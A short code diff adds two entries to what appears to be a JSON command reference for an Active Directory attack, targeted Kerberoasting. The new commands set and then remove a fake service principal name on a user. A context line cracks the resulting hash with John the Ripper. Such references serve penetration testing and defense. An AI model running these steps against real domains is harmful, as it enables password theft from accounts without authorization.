@@ -107,6 +107,14 @@
   },
   "variations": [
     {
+      "label": "Set SPN via AD Module",
+      "command": "Set-ADUser -Identity <user> -ServicePrincipalNames @{Add='nonexistent/BLAH'}"
+    },
+    {
+      "label": "Remove SPN via AD Module (cleanup)",
+      "command": "Set-ADUser -Identity <user> -ServicePrincipalNames @{Remove='nonexistent/BLAH'}"
+    },
+    {
       "label": "Crack the targeted hash (John)",
       "command": "john.exe --wordlist=<wordlist> <hashfile>"
     }
